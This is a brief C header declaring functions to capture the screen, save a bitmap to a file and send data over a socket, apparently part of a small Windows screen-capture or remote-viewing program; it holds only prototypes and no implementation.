#pragma once
#include "lib.h"

void SaveBitmap(HBITMAP hBitmap, HDC hdc, int width, int height, const char* filepath);

void CaptureScreen(const char* filepath);

void send_imp(SOCKET new_sock);